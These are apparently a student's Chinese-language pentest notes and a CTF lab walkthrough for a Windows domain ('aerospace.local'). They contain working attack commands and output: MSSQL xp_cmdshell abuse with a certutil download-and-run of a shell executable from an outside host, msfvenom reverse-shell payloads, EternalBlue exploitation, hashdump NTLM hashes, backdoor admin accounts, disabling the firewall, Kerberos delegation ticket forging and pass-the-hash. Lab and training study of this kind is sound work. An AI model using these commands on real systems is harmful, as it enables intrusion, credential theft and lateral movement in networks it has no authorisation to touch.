渗透记录

内外网怎么联通

内网提供服务，由防火墙/路由器做端口映射，外网往往只能扫到80/443这种端口

域和工作组  区别

域控    不同域不能互相访问，除非建立信任关系

父域（eg：abc.com）和子域(eg:asia.abc.com)形成域树网路    ------域树连在一起成域林

父子默认信任关系，存在信任传递关系

内网会放一台dns，一般内网渗透，就是寻找dns服务器来定位dc（dns服务器和dc通常会处在同一台机器上）



域中计算机

域本地组/全局组/通用组

AGDLP策略



域环境搭建

1、设置静态IP（自己的域控）

2、dcpromo      C：/NTDS

创建域用户    net user xy 123.com/add          可在计算机里面加入域

dns要改成自己提供的        

3、给相应用户下发组策略      通过策略进行操控

gpupdate /force    强制刷新策略



子域   在现有林

副域控   建立冗余

域林互信：需要添加转发器



分析内网网络拓扑



uac提权

ncpa.cpl

如何查找内网网段：

1.工具扫网段（192.168.0.xx->1.0->2.0等等）

推荐s.exe   syn  192.168.0.0    192.168.255.255    445

2.文件共享链接记录

\\\\1        mstsc 3389

3、抓包分析网络流量（kali   msf    msterpreter）

4、爆破路由器



看进程

tasklist 

查询端口列表

netstat -ano  

systeminfo

net share    查看共享文件夹

at 查看计划任务

查看用户列表

net localgroup administrators

查看在线用户

query user

 arp -a   主机在内网通信的话有一个请求访问，进行一个广播

内网走mac地址  （有arp攻击，缓冲表欺骗）

netsh 可做端口转发，我们可以达到访问内网端口的目的

不要把自己的盘挂载到别人服务器上

empire 的arpscan模块

nbtscan

```
whoami
whoami/all 获取SID
net user xxx/domain
net user /domain
ipconfig/all
systeminfo
net config workstation
net time/domain 判断主域控

mstsc
query user
test /domain_trusts
net account /domain

powershell.exe -exec bypass 
powersploit    无文件攻击   需要搭载一个vps进行调用

msf使用
load powershell
powershell_import
powershell_
powershell_exectue getNetDomain

服务
爆破
漏洞  smb
欺骗
钓鱼

抓http/https
1、强制转换使用http协议
2、钓鱼
```



hashdump？？？

一些抓流量的工具（arp欺骗）

wireshark

cain

NetFuck(需要启动winpcap)

EvilFOCA

流量劫持，xssflash

、

内网欺骗,挂sock代理

```
ettercap
ettercap  -c
ettercap  -G
ifconfig
scan for host
dns欺骗  
vi /etc/ettercap/etter.dns 
强制转换成http（允许接收http流量
跨网段抓取流量欺骗
抓取图片

```

服务密码攻击

- 在线密码  网络

- 离线   得到密文 加载字典 本地爆破（需要cpu和gpu性能 ）

  **hashcat**

  hash-idendifier  加密类型

  john

  john 1.txt --show

  ![image-20241209191526096](C:\Users\Annie\AppData\Roaming\Typora\typora-user-images\image-20241209191526096.png)

  

内网主机横向

扫描端口 分析服务 后进行爆破攻击

1. Linux /22/80/443/
2. Windows /139/135/3389/445/1433

445 smb优先

推荐工具：

hydra 

```
htdra -l administrator -P pass.txt -t 线程数 -vV  telnet://ip资质
```

superdic

medusa 



---

压缩包破解

fcrackzip --help

rarcrack

**无线渗透**

wifi密码破解(搁置一下)

mac地址修改器

usb无线网卡

![image-20241209200020517](C:\Users\Annie\AppData\Roaming\Typora\typora-user-images\image-20241209200020517.png)

kali需要足够空间才可以跑

airodump

aireplay 

也可以用hashcat爆破wifi密码

作业：

wifi钓鱼 github

---

  ftp爆破工具 hscan 

提权工具

psexec 

incognito2

token劫持注入

smb 445端口

ms08067 nt5.0

ms17-010 win7 nt6.0 nt5.0   

2020-



linux通过smbclient 访问Windows的共享文件目录

需要安装  



本地rdp读取（服务器有没有登录其他机器的记录）

 使用mimikatz

### 使用xp_cmdshell进行提权

> xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除

0x01 xp_cmdshell简介

`xp``_cmdshell`是`Sql Server`中的一个组件，将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。通常在拿到sa口令之后，可以通过`xp``_cmdshell`来进行提权

**影响范围：**

只要该数据库存在该组件，就可以利用

0x02 xp_cmdshell使用



kali重启网卡命令dhclient -v

Metasploit基本渗透框架



```
msf6 > db_nmap -sU -sV -p 1433 192.168.194.137
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 13:30 CST
[*] Nmap: Nmap scan report for 192.168.194.137
[*] Nmap: Host is up (0.00053s latency).
[*] Nmap: PORT     STATE         SERVICE  VERSION
[*] Nmap: 1433/udp open|filtered ms-sql-s
[*] Nmap: MAC Address: 00:0C:29:03:3B:F9 (VMware)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 99.65 seconds
msf6 > db_nmap -sU --script=ms-sql-info -p 1433 192.168.194.137
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 13:33 CST
[*] Nmap: Nmap scan report for 192.168.194.137
[*] Nmap: Host is up (0.00094s latency).
[*] Nmap: PORT     STATE         SERVICE
[*] Nmap: 1433/udp open|filtered ms-sql-s
[*] Nmap: MAC Address: 00:0C:29:03:3B:F9 (VMware)
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 5.87 seconds
msf6 > use auxiliary/scanner/mssql/mssql_login 
msf6 auxiliary(scanner/mssql/mssql_login) > show options

Module options (auxiliary/scanner/mssql/mssql_login):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   ANONYMOUS_LOGIN      false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS      true             no        Try blank passwords for all users
   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current d
                                                   atabase
   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
   DB_ALL_USERS         false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING     none             no        Skip existing credentials stored in the current datab
                                                   ase (Accepted: none, user, user&realm)
   PASSWORD                              no        A specific password to authenticate with
   PASS_FILE                             no        File containing passwords, one per line
   RHOSTS                                yes       The target host(s), see https://docs.metasploit.com/d
                                                   ocs/using-metasploit/basics/using-metasploit.html
   RPORT                1433             yes       The target port (TCP)
   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads (max one per host)
   USERNAME             sa               no        A specific username to authenticate as
   USERPASS_FILE                         no        File containing users and passwords separated by spac
                                                   e, one pair per line
   USER_AS_PASS         false            no        Try the username as the password for all users
   USER_FILE                             no        File containing usernames, one per line
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option se
                                                   t)
   VERBOSE              true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/mssql/mssql_login) > set rhosts 192.168.194.137
rhosts => 192.168.194.137
msf6 auxiliary(scanner/mssql/mssql_login) > set username sa
username => sa
msf6 auxiliary(scanner/mssql/mssql_login) > set password 123456
password => 123456
msf6 auxiliary(scanner/mssql/mssql_login) > set threads 10
threads => 10
msf6 auxiliary(scanner/mssql/mssql_login) > run

[*] 192.168.194.137:1433  - 192.168.194.137:1433 - MSSQL - Starting authentication scanner.
[+] 192.168.194.137:1433  - 192.168.194.137:1433 - Login Successful: WORKSTATION\sa:123456
[*] 192.168.194.137:1433  - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mssql/mssql_login) > use auxiliary/scanner/mssql/mssql_hashdump 
msf6 auxiliary(scanner/mssql/mssql_hashdump) > show options

Module options (auxiliary/scanner/mssql/mssql_hashdump):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), see https://docs.metasploit.com/d
                                                   ocs/using-metasploit/basics/using-metasploit.html
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads (max one per host)
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option se
                                                   t)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/mssql/mssql_hashdump) > set rhosts 192.168.194.137
rhosts => 192.168.194.137
msf6 auxiliary(scanner/mssql/mssql_hashdump) > set password 123456
password => 123456
msf6 auxiliary(scanner/mssql/mssql_hashdump) > set threads 10
threads => 10
msf6 auxiliary(scanner/mssql/mssql_hashdump) > run

[*] 192.168.194.137:1433  - Instance Name: nil
[*] 192.168.194.137:1433  - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mssql/mssql_hashdump) > use auxiliary/admin/mssql/mssql_enum
msf6 auxiliary(admin/mssql/mssql_enum) > show options

Module options (auxiliary/admin/mssql/mssql_enum):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), see https://docs.metasploit.com/d
                                                   ocs/using-metasploit/basics/using-metasploit.html
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option se
                                                   t)


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/mssql/mssql_enum) > set password 123456
password => 123456
msf6 auxiliary(admin/mssql/mssql_enum) > set rhosts 192.168.194.137
rhosts => 192.168.194.137
msf6 auxiliary(admin/mssql/mssql_enum) > run
[*] Running module against 192.168.194.137

[*] 192.168.194.137:1433 - Running MS SQL Server Enumeration...
[*] 192.168.194.137:1433 - Version:
[*]     Microsoft SQL Server 2016 (SP1) (KB3182545) - 13.0.4001.0 (X64) 
[*]             Oct 28 2016 18:17:30 
[*]             Copyright (c) Microsoft Corporation
[*]             Enterprise Edition (64-bit) on Windows Server 2019 Datacenter 6.3 <X64> (Build 17763: ) (Hypervisor)
[*] 192.168.194.137:1433 - Configuration Parameters:
[*] 192.168.194.137:1433 -      C2 Audit Mode is Not Enabled
[*] 192.168.194.137:1433 -      xp_cmdshell is Enabled
[*] 192.168.194.137:1433 -      remote access is Enabled
[*] 192.168.194.137:1433 -      allow updates is Not Enabled
[*] 192.168.194.137:1433 -      Database Mail XPs is Not Enabled
[*] 192.168.194.137:1433 -      Ole Automation Procedures are Not Enabled
[*] 192.168.194.137:1433 - Databases on the server:
[*] 192.168.194.137:1433 -      Database name:master
[*] 192.168.194.137:1433 -      Database Files for master:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\master.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
[*] 192.168.194.137:1433 -      Database name:tempdb
[*] 192.168.194.137:1433 -      Database Files for tempdb:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\tempdb.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\templog.ldf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\tempdb_mssql_2.ndf
[*] 192.168.194.137:1433 -      Database name:model
[*] 192.168.194.137:1433 -      Database Files for model:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\model.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\modellog.ldf
[*] 192.168.194.137:1433 -      Database name:msdb
[*] 192.168.194.137:1433 -      Database Files for msdb:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\MSDBData.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\MSDBLog.ldf
[*] 192.168.194.137:1433 -      Database name:ReportServer
[*] 192.168.194.137:1433 -      Database Files for ReportServer:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\ReportServer.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\ReportServer_log.ldf
[*] 192.168.194.137:1433 -      Database name:ReportServerTempDB
[*] 192.168.194.137:1433 -      Database Files for ReportServerTempDB:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\ReportServerTempDB.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\ReportServerTempDB_log.ldf
[*] 192.168.194.137:1433 -      Database name:DWDiagnostics
[*] 192.168.194.137:1433 -      Database Files for DWDiagnostics:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWDiagnostics.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWDiagnostics_log.ldf
[*] 192.168.194.137:1433 -      Database name:DWConfiguration
[*] 192.168.194.137:1433 -      Database Files for DWConfiguration:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWConfiguration.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWConfiguration_log.ldf
[*] 192.168.194.137:1433 -      Database name:DWQueue
[*] 192.168.194.137:1433 -      Database Files for DWQueue:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWQueue.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWQueue_log.ldf
[*] 192.168.194.137:1433 - System Logins on this Server:
[*] 192.168.194.137:1433 -      sa
[*] 192.168.194.137:1433 -      ##MS_SQLResourceSigningCertificate##
[*] 192.168.194.137:1433 -      ##MS_SQLReplicationSigningCertificate##
[*] 192.168.194.137:1433 -      ##MS_SQLAuthenticatorCertificate##
[*] 192.168.194.137:1433 -      ##MS_PolicySigningCertificate##
[*] 192.168.194.137:1433 -      ##MS_SmoExtendedSigningCertificate##
[*] 192.168.194.137:1433 -      ##MS_PolicyTsqlExecutionLogin##
[*] 192.168.194.137:1433 -      WIN-IISSERVER\Administrator
[*] 192.168.194.137:1433 -      NT SERVICE\SQLWriter
[*] 192.168.194.137:1433 -      NT SERVICE\Winmgmt
[*] 192.168.194.137:1433 -      NT Service\MSSQLSERVER
[*] 192.168.194.137:1433 -      NT AUTHORITY\SYSTEM
[*] 192.168.194.137:1433 -      NT SERVICE\SQLSERVERAGENT
[*] 192.168.194.137:1433 -      NT SERVICE\ReportServer
[*] 192.168.194.137:1433 -      NT AUTHORITY\NETWORK SERVICE
[*] 192.168.194.137:1433 -      l_certSignSmDetach
[*] 192.168.194.137:1433 -      NT SERVICE\SQLTELEMETRY
[*] 192.168.194.137:1433 -      ##MS_PolicyEventProcessingLogin##
[*] 192.168.194.137:1433 -      ##MS_AgentSigningCertificate##
[*] 192.168.194.137:1433 - Disabled Accounts:
[*] 192.168.194.137:1433 -      ##MS_PolicyTsqlExecutionLogin##
[*] 192.168.194.137:1433 -      ##MS_PolicyEventProcessingLogin##
[*] 192.168.194.137:1433 - No Accounts Policy is set for:
[*] 192.168.194.137:1433 -      sa
[*] 192.168.194.137:1433 - Password Expiration is not checked for:
[*] 192.168.194.137:1433 -      sa
[*] 192.168.194.137:1433 -      ##MS_PolicyTsqlExecutionLogin##
[*] 192.168.194.137:1433 -      ##MS_PolicyEventProcessingLogin##
[*] 192.168.194.137:1433 - System Admin Logins on this Server:
[*] 192.168.194.137:1433 -      sa
[*] 192.168.194.137:1433 -      WIN-IISSERVER\Administrator
[*] 192.168.194.137:1433 -      NT SERVICE\SQLWriter
[*] 192.168.194.137:1433 -      NT SERVICE\Winmgmt
[*] 192.168.194.137:1433 -      NT Service\MSSQLSERVER
[*] 192.168.194.137:1433 -      NT SERVICE\SQLSERVERAGENT
[*] 192.168.194.137:1433 -      l_certSignSmDetach
[*] 192.168.194.137:1433 - Windows Logins on this Server:
[*] 192.168.194.137:1433 -      WIN-IISSERVER\Administrator
[*] 192.168.194.137:1433 -      NT SERVICE\SQLWriter
[*] 192.168.194.137:1433 -      NT SERVICE\Winmgmt
[*] 192.168.194.137:1433 -      NT Service\MSSQLSERVER
[*] 192.168.194.137:1433 -      NT AUTHORITY\SYSTEM
[*] 192.168.194.137:1433 -      NT SERVICE\SQLSERVERAGENT
[*] 192.168.194.137:1433 -      NT SERVICE\ReportServer
[*] 192.168.194.137:1433 -      NT AUTHORITY\NETWORK SERVICE
[*] 192.168.194.137:1433 -      NT SERVICE\SQLTELEMETRY
[*] 192.168.194.137:1433 - Windows Groups that can logins on this Server:
[*] 192.168.194.137:1433 -      No Windows Groups where found with permission to login to system.
[*] 192.168.194.137:1433 - Accounts with Username and Password being the same:
[*] 192.168.194.137:1433 -      No Account with its password being the same as its username was found.
[*] 192.168.194.137:1433 - Accounts with empty password:
[*] 192.168.194.137:1433 -      No Accounts with empty passwords where found.
[*] 192.168.194.137:1433 - Stored Procedures with Public Execute Permission found:
[*] 192.168.194.137:1433 -      sp_replsetsyncstatus
[*] 192.168.194.137:1433 -      sp_replcounters
[*] 192.168.194.137:1433 -      sp_replsendtoqueue
[*] 192.168.194.137:1433 -      sp_resyncexecutesql
[*] 192.168.194.137:1433 -      sp_prepexecrpc
[*] 192.168.194.137:1433 -      sp_repltrans
[*] 192.168.194.137:1433 -      sp_xml_preparedocument
[*] 192.168.194.137:1433 -      xp_qv
[*] 192.168.194.137:1433 -      xp_getnetname
[*] 192.168.194.137:1433 -      sp_releaseschemalock
[*] 192.168.194.137:1433 -      sp_refreshview
[*] 192.168.194.137:1433 -      sp_replcmds
[*] 192.168.194.137:1433 -      sp_unprepare
[*] 192.168.194.137:1433 -      sp_resyncprepare
[*] 192.168.194.137:1433 -      sp_createorphan
[*] 192.168.194.137:1433 -      xp_dirtree
[*] 192.168.194.137:1433 -      sp_replwritetovarbin
[*] 192.168.194.137:1433 -      sp_replsetoriginator
[*] 192.168.194.137:1433 -      sp_xml_removedocument
[*] 192.168.194.137:1433 -      sp_repldone
[*] 192.168.194.137:1433 -      sp_reset_connection
[*] 192.168.194.137:1433 -      xp_fileexist
[*] 192.168.194.137:1433 -      xp_fixeddrives
[*] 192.168.194.137:1433 -      sp_getschemalock
[*] 192.168.194.137:1433 -      sp_prepexec
[*] 192.168.194.137:1433 -      xp_revokelogin
[*] 192.168.194.137:1433 -      sp_execute_external_script
[*] 192.168.194.137:1433 -      sp_resyncuniquetable
[*] 192.168.194.137:1433 -      sp_replflush
[*] 192.168.194.137:1433 -      sp_resyncexecute
[*] 192.168.194.137:1433 -      xp_grantlogin
[*] 192.168.194.137:1433 -      sp_droporphans
[*] 192.168.194.137:1433 -      xp_regread
[*] 192.168.194.137:1433 -      sp_getbindtoken
[*] 192.168.194.137:1433 -      sp_replincrementlsn
[*] 192.168.194.137:1433 - Instances found on this server:
[*] 192.168.194.137:1433 -      MSSQLSERVER
[*] 192.168.194.137:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 192.168.194.137:1433 -      NT Service\MSSQLSERVER
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_enum) > use auxiliary/admin/mssql/mssql_exec
msf6 auxiliary(admin/mssql/mssql_exec) > show options                                                                                                    
                                                                                                                                                         
Module options (auxiliary/admin/mssql/mssql_exec):                                                                                                       
                                                                                                                                                         
   Name                 Current Setting                       Required  Description                                                                      
   ----                 ---------------                       --------  -----------
   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
   PASSWORD                                                   no        The password for the specified username
   RHOSTS                                                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                                                        s/using-metasploit.html
   RPORT                1433                                  yes       The target port (TCP)
   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data "Force Encryption"
   TECHNIQUE            xp_cmdshell                           yes       Technique to use for command execution (Accepted: xp_cmdshell, sp_oacreate)
   USERNAME             sa                                    no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentication (requires DOMAIN option set)


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/mssql/mssql_exec) > set rhosts 192.168.194.137
rhosts => 192.168.194.137
msf6 auxiliary(admin/mssql/mssql_exec) > set password 123456
password => 123456
msf6 auxiliary(admin/mssql/mssql_exec) > set cmd 'ipconfig'
cmd => ipconfig
msf6 auxiliary(admin/mssql/mssql_exec) > run
[*] Running module against 192.168.194.137

[*] 192.168.194.137:1433 - SQL Query: EXEC master..xp_cmdshell 'ipconfig'



 output
 ------
 Windows IP M�n
 �N*YQ�M�hV Ethernet0:
 ���cyr�[�v DNS T . . . . . . . : localdomain
 ,g0W���c IPv6 0W@W. . . . . . . . : fe80::4164:1c45:67cc:f618%13
 IPv4 0W@W . . . . . . . . . . . . : 192.168.194.137
 P[Q�cx  . . . . . . . . . . . . : 255.255.255.0
 ����QsQ. . . . . . . . . . . . . : 192.168.194.2
 �N*YQ�M�hV Ethernet1:
 ���cyr�[�v DNS T . . . . . . . :
 ,g0W���c IPv6 0W@W. . . . . . . . : fe80::7c7d:6a20:cf11:8576%8
 IPv4 0W@W . . . . . . . . . . . . : 172.22.10.22
 P[Q�cx  . . . . . . . . . . . . : 255.255.255.0
 ����QsQ. . . . . . . . . . . . . : 172.22.10.1

[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_exec) > 

```



（Cobalt Strike）cs提权

```
增加执行权限
chmod +x agscript
chmod +x teamserver

这俩加不起不知道
chmod +x c2lint
chmod +x peclone
```





msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.194.129 lport=81 -f exe -o /var/www/html/shell.exe

*# lhost 是kali的ip* *# lport 是kali监听端口*

```
/* 判断当前是否为 DBA 权限，返回 1 则可以提权 */
SELECT IS_SRVROLEMEMBER('sysadmin');

/* 查看是否存在 xp_cmdshell，返回 1 则存在 */
SELECT COUNT(*) FROM master.dbo.sysobjects WHERE xtype='x' AND name='xp_cmdshell'

/* 开启 xp_cmdshell */
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;

/* 执行系统命令 */
EXEC master.dbo.xp_cmdshell 'cd C:\Users\Public & certutil -urlcache -split -f http://192.168.162.130:8080/she1l.exe';

EXEC master.dbo.xp_cmdshell 'C:\Users\Public\she1l.exe'
```



# web01

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.194.129   # msf所在主机的ip
set lport 99     # msf所在主机自定义端口号
run
getuid
getsystem  提权成功

获取hash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cb136a448767792bae25563a498a86e6:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1004:aad3b435b51404eeaad3b435b51404ee:0cb6948805f797bf2a82807973b89537:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:ec989ddafb499b3b3ebf7220c417cc9d:::

hash破解得到密码
Admin@1234
远程桌面连接
成功获取flag01
```

```
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
set rhosts 172.22.10.36
exploit

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John:1000:aad3b435b51404eeaad3b435b51404ee:2256edb17da7455f7fa0aac2af2de0d1:::
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

shell
chcp 65001
net user test Aa123456 /add
net localgroup administrators test /add

```

```
添加路由（sock4）
run autoroute -s 172.22.10.0/24
run autoroute -p
background
use socks_proxy
options
set srvhost 192.168.194.129  #应该是本机的
set srvport 30090
set version 4a
run

修改配置文件
vi /etc/proxychains4.conf 
socks4 192.168.194.129 30090

run post/windows/gather/arp-scanner RHOST=172.22.10.0/24
```

![image-20241201233846205](C:\Users\Annie\AppData\Roaming\Typora\typora-user-images\image-20241201233846205.png)

![image-20241201233940752](C:\Users\Annie\AppData\Roaming\Typora\typora-user-images\image-20241201233940752.png)

![image-20241201234134600](C:\Users\Annie\AppData\Roaming\Typora\typora-user-images\image-20241201234134600.png)

route add 172.22.10.0 255.255.255.0 1

route print

# 挂代理

路由设置(拿到web01的meterpreter之后设置)

```
run post/multi/manage/autoroute
run autoroute -p
background
use auxiliary/server/socks_proxy
search autoroute
use 0
options
set session 1
exploit
到这里msf就能利用了已经

use auxiliary/scanner/portscan/tcp
options
set rhosts 172.22.10.22
exploit

设置socket代理
background
search socks
use 0
options
run
vi /etc/proxychains4.conf   （用的那个就只开哪个端口的socket）
 
job
-i 
-k
```

# WIN-PC8086 

这台域成员机器存在 MS17_010 漏洞，ip为 172.22.10.36，使用 msf 挂上代理，用 bind_tcp 类型的 payload 直接打：

```
先可以扫描一下
msf6 > search ms17_010
use 3
set rhosts 172.22.10.36
run

use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
set rhosts 172.22.10.36
set lport 4444
run

type C:\Users\Administrator\flag02.txt
```

# msf转发到cs

```
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set LHOST 103.234.72.5 //cs主机地址
set LPORT 84 //随意设置监听端口，需要和cs保持一致
set session 2 //设置需要派送的meterpreter
set DisablePayloadHandler true //禁止产生一个新的handler
```



枚举域内委派关系

```
proxychains4 python3 findDelegation.py aerospace.local/WIN-PC8086\$ -hashes :680f2285800a0da67b4d6aa443ed0ab2 -dc-ip 172.22.10.11
```

```
proxychains4 python3 getST.py aerospace.local/WIN-PC8086\$ -hashes :680f2285800a0da67b4d6aa443ed0ab2 -spn CIFS/WIN-PC8098.aerospace.local -impersonate Administrator -dc-ip 172.22.10.11

Saving ticket in Administrator@CIFS_WIN-PC8098.aerospace.local@AEROSPACE.LOCAL.ccache


```



![image-20241203162837820](C:\Users\Annie\AppData\Roaming\Typora\typora-user-images\image-20241203162837820.png)

680f2285800a0da67b4d6aa443ed0ab2

proxychains4 curl http://172.22.10.22

# 172.22.10.11

```
use auxiliary/scanner/smb/smb_ms17_010
set rhost 172.22.10.11
run
use windows/smb/ms17_010_psexec 
set payload windows/x64/meterpreter/bind_tcp
set rhosts 172.22.10.11
set lport 6666
run
```

成功获取 SYSTEM 权限：

远程管理开启

```
idletime
run post/windows/manage/enable_rdp

wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```

或者

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

查看3389端口是否开启

```
netstat -ano | findstr "3389"
```

关闭防火墙

```
netsh firewall set opmode disable
```

尝试kali远程连接

/u就是用户名，/p是密码，/v是靶机（目标）的地址 /size就是图形化界面的大小

```
xfreerdp /u:test /p:Aa123456 /v:172.22.10.11 /size:80%
```

meterpreter > hashdump
Administrator:aad3b435b51404eeaad3b435b51404ee:4e4b335d557d9c79bc419490672102b2

#   CA13

既然拿到域控了直接hash传递

以exploit/windows/smb/psexec为例，设置参数，smbpassword可以用哈希值或者是明文密码，使用hash时要使用完整的格式，即LM Hash:NTLM Hash，如果不知道LM Hash可以使用32位0来补全。

````
use auxiliary/admin/smb/ms17_010_command //在目标系统执行命令
use exploit/windows/smb/psexec                     //用psexec执行系统命令 
set SMBPass aad3b435b51404eeaad3b435b51404ee:4e4b335d557d9c79bc419490672102b2
set SMBUser Administrator
set payload payload/windows/x64/meterpreter/bind_tcp
set lhost 172.22.10.22
set rhosts 172.22.10.13
run
````



补充

##### 哈希传递

###### msf hash 传递

现在有多种hash传递的方式，本篇文章使用msf 来进行hash传递，也没啥别的理由，就是因为操作比较简单，

hash 传递的模块

```
执行单个命令的PTH模块
auxiliary/admin/smb/psexec_command

执行直接就获取到meterpreter的PTH模块
exploit/windows/smb/psexec

支持对一个网段进行PTH进行验证的模块
exploit/windows/smb/psexec_psh
```

下面这张图为exploit/windows/smb/psexec,使用时的配置，SMBPASS 就是抓取的hash.

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/805fdac4228819fc008ef4aeafd1907e.png)

# 8098 40

```
proxychains nmap -sV -sT -sC -o 172.22.10.40  
```



# flag

"flag01: flag{95db2e27-6fac-4712-bf0f-054d4157b8e0}"

"flag02: flag{16ce20eb-9240-4e00-9f7a-3694c8de6eeb}" 



flag04: flag{341ca80d-0218-4345-bdfc-7faed8a368df} 

